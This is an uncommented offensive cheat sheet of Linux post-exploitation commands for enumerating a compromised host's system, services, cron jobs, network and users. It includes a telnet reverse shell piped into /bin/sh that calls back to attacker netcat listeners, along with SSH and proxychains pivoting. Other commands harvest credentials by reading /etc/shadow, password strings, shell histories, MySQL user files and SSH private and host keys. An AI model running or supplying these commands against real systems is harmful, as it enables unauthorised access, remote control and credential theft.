# What version?
cat /etc/issue
cat /etc/*-release
  cat /etc/lsb-release      # Debian based
  cat /etc/redhat-release   # Redhat based
###################################################
#  What's the kernel version? Is it 64-bit?
cat /proc/version
uname -a
uname -mrs
rpm -q kernel
dmesg | grep Linux
ls /boot | grep vmlinuz-
####################################################
#  
ps aux
ps -ef
top
cat /etc/services
ps aux | grep root
ps -ef | grep root
#####################################################
# What applications are installed? What version are they? Are they currently running?
ls -alh /usr/bin/
ls -alh /sbin/
dpkg -l
rpm -qa
ls -alh /var/cache/apt/archivesO
ls -alh /var/cache/yum/
######################################################
cat /etc/syslog.conf
cat /etc/chttp.conf
cat /etc/lighttpd.conf
cat /etc/cups/cupsd.conf
cat /etc/inetd.conf
cat /etc/apache2/apache2.conf
cat /etc/my.conf
cat /etc/httpd/conf/httpd.conf
cat /opt/lampp/etc/httpd.conf
ls -aRl /etc/ | awk '$1 ~ /^.*r.*/
#####################################################
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
#####################################################
grep -i user [filename]
grep -i pass [filename]
grep -C 5 "password" [filename]
find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"   # Joomla
#################################################################################################
####                                                                                         ####
####               Communications & Networking                                               ####
####                                                                                         ####
#################################################################################################
#    Communications & Networking
/sbin/ifconfig -a
cat /etc/network/interfaces
cat /etc/sysconfig/network
######################################################
cat /etc/resolv.conf
cat /etc/sysconfig/network
cat /etc/networks
iptables -L
hostname
dnsdomainname
######################################################
lsof -i
lsof -i :80
grep 80 /etc/services
netstat -antup
netstat -antpx
netstat -tulpn
chkconfig --list
chkconfig --list | grep 3:on
last
w
######################################################
arp -e
route
/sbin/route -nee
######################################################
tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21
#
#    Note: tcpdump tcp dst [ip] [port] and tcp dst [ip] [port]
#
######################################################
nc -lvp 4444    # Attacker. Input (Commands)
nc -lvp 4445    # Attacker. Ouput (Results)
telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445    # On the targets system. Use the attackers IP!
#### https://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/  
####
#########################################################################################
#    Note: ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]    #
#                                                                                       #
#########################################################################################
ssh -L 8080:127.0.0.1:80 root@192.168.1.7    # Local Port
ssh -R 8080:127.0.0.1:80 root@192.168.1.7    # Remote Port

###############################################################
ssh -D 127.0.0.1:9050 -N [username]@[ip]
proxychains ifconfig





############################################################################################
####                                                                                    ####
####                    Confidential Information & Users                                ####
####                                                                                    ####
############################################################################################
id
who
w
last
cat /etc/passwd | cut -d: -f1    # List of users
grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'   # List of super users
awk -F: '($3 == "0") {print}' /etc/passwd   # List of super users
cat /etc/sudoers
sudo -l
#############################################################################################
cat /etc/passwd
cat /etc/group
cat /etc/shadow
ls -alh /var/mail/
#############################################################################################
ls -ahlR /root/
ls -ahlR /home/
####
cat /var/apache2/config.inc
cat /var/lib/mysql/mysql/user.MYD
cat /root/anaconda-ks.cfg
####
cat ~/.bash_history
cat ~/.nano_history
cat ~/.atftp_history
cat ~/.mysql_history
cat ~/.php_history
####
cat ~/.bashrc
cat ~/.profile
cat /var/mail/root
cat /var/spool/mail/root
##########################################################################################
####                  KEYS
####
cat ~/.ssh/authorized_keys
cat ~/.ssh/identity.pub
cat ~/.ssh/identity
cat ~/.ssh/id_rsa.pub
cat ~/.ssh/id_rsa
cat ~/.ssh/id_dsa.pub
cat ~/.ssh/id_dsa
cat /etc/ssh/ssh_config
cat /etc/ssh/sshd_config
cat /etc/ssh/ssh_host_dsa_key.pub
cat /etc/ssh/ssh_host_dsa_key
cat /etc/ssh/ssh_host_rsa_key.pub
cat /etc/ssh/ssh_host_rsa_key
cat /etc/ssh/ssh_host_key.pub
cat /etc/ssh/ssh_host_key
####


